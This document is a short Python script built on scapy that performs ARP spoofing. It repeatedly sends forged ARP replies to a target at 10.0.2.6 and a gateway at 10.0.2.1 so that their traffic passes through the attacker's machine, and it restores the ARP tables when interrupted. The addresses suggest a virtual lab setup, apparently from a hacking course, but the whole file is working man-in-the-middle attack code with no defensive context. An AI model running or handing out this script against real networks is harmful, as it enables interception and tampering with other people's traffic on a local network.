#!/usr/bin/env python

import scapy.all as sc
import time
import sys


# function to spoof mac addresses between router and target ip.
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sc.send(packet, verbose=False)


def restore(des_ip, source_ip):
    des_mac = get_mac(des_ip)
    source_mac = get_mac(source_ip)
    packet = sc.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=source_ip, hwsrc=source_mac)
    sc.send(packet, count=4, verbose=False)


# function to take in an ip address and use it with broadcast MAC address to send out an ARP request to determine MAC of
# requested IP.
def get_mac(ip):
    arp_request = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_bcast = broadcast/arp_request
    answered = sc.srp(arp_req_bcast, timeout=2, verbose=False)[0]

    return answered[0][1].hwsrc


target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"

try:
    counter = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        counter += 2
        print("\r[*] Packets sent: {}".format(counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Detected CTRL + C.........resetting ARP tables........Please wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Finished.......Quiting.")








